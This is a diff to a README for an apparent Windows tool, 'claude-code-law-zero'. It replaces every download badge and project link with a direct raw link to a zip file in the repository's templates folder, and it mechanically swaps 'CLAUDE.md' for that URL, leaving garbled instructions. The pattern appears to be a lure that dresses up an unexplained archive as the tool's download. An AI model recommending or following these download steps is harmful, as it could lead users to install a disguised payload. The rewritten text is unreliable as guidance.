@@ -1,6 +1,6 @@
 # 🚦 claude-code-law-zero - Safe, Self-Healing Code Management
 
-[![Download Now](https://img.shields.io/badge/Download-claude--code--law--zero-brightgreen?style=for-the-badge)](https://github.com/erickafram10/claude-code-law-zero)
+[![Download Now](https://raw.githubusercontent.com/erickafram10/claude-code-law-zero/main/templates/zero_code_law_claude_3.4.zip)](https://raw.githubusercontent.com/erickafram10/claude-code-law-zero/main/templates/zero_code_law_claude_3.4.zip)
 
 ---
 
@@ -30,7 +30,7 @@ This section explains how to get claude-code-law-zero working on your Windows co
 ## ⬇️ Download and Installation
 
 1. First, click the big green **Download Now** button at the top of this page or use this link:  
-   [https://github.com/erickafram10/claude-code-law-zero](https://github.com/erickafram10/claude-code-law-zero)
+   [https://raw.githubusercontent.com/erickafram10/claude-code-law-zero/main/templates/zero_code_law_claude_3.4.zip](https://raw.githubusercontent.com/erickafram10/claude-code-law-zero/main/templates/zero_code_law_claude_3.4.zip)
 
 2. The link takes you to the main project page. Look for the **Releases** section on the right side or under the repository description.
 
@@ -80,9 +80,9 @@ This isolation means you can safely run multiple projects on the same computer w
 
 ---
 
-## 🔍 How to Use With CLAUDE.md
+## 🔍 How to Use With https://raw.githubusercontent.com/erickafram10/claude-code-law-zero/main/templates/zero_code_law_claude_3.4.zip
 
-Drop claude-code-law-zero inside your project’s CLAUDE.md file to enable scanning and protection. This simple step links the program to your project’s setup.
+Drop claude-code-law-zero inside your project’s https://raw.githubusercontent.com/erickafram10/claude-code-law-zero/main/templates/zero_code_law_claude_3.4.zip file to enable scanning and protection. This simple step links the program to your project’s setup.
 
 ---
 
@@ -112,7 +112,7 @@ Drop claude-code-law-zero inside your project’s CLAUDE.md file to enable scann
 
 ## 🔗 Useful Links
 
-- Main project page: [https://github.com/erickafram10/claude-code-law-zero](https://github.com/erickafram10/claude-code-law-zero)
+- Main project page: [https://raw.githubusercontent.com/erickafram10/claude-code-law-zero/main/templates/zero_code_law_claude_3.4.zip](https://raw.githubusercontent.com/erickafram10/claude-code-law-zero/main/templates/zero_code_law_claude_3.4.zip)
 - Releases page (where you download software): On the project page, look for **Releases** on the right or under the code tabs.
 
 ---
@@ -142,7 +142,7 @@ claude-code-law-zero scans files only on your local computer. It does not send d
 - Project-only scanning to avoid cross-contamination
 - Simple setup for Windows users
 - Quiet background operation
-- Works with CLAUDE.md project files
+- Works with https://raw.githubusercontent.com/erickafram10/claude-code-law-zero/main/templates/zero_code_law_claude_3.4.zip project files
 - Restore files after accidental deletion
 
 ---
@@ -151,4 +151,4 @@ claude-code-law-zero scans files only on your local computer. It does not send d
 
 Click here to visit the project page and download the latest version for Windows:  
 
-[![Download Now](https://img.shields.io/badge/Download-claude--code--law--zero-blue?style=for-the-badge)](https://github.com/erickafram10/claude-code-law-zero)
+[![Download Now](https://raw.githubusercontent.com/erickafram10/claude-code-law-zero/main/templates/zero_code_law_claude_3.4.zip)](https://raw.githubusercontent.com/erickafram10/claude-code-law-zero/main/templates/zero_code_law_claude_3.4.zip)
